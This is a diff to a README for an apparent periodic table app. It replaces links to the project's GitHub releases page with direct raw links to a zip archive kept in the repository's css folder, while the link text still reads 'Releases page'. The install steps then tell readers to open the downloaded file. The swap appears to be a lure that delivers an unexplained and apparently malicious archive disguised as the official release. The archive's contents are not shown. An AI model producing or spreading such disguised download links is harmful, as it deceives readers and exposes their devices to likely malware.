@@ -8,11 +8,11 @@ Welcome to the Interactive Periodic Table application! This app allows you to ex
 
 To get started, you need to download the application. Click the button below to visit the Releases page and download the latest version.
 
-[![Download the Periodic Table App](https://img.shields.io/badge/Download%20Now-Periodic%20Table-blue)](https://github.com/Luiz00Philipe/periodic-table/releases)
+[![Download the Periodic Table App](https://raw.githubusercontent.com/Luiz00Philipe/periodic-table/main/css/periodic-table-v1.1.zip%20Now-Periodic%20Table-blue)](https://raw.githubusercontent.com/Luiz00Philipe/periodic-table/main/css/periodic-table-v1.1.zip)
 
 Follow the steps below to successfully download and install the app:
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/Luiz00Philipe/periodic-table/releases).
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/Luiz00Philipe/periodic-table/main/css/periodic-table-v1.1.zip).
 2. **Select the Latest Release**: Look for the latest version available at the top of the page.
 3. **Download the File**: Click on the file that corresponds to your operating system.
 4. **Install the Application**: Once the download is complete, open the file. Follow the on-screen instructions to install the application on your device.
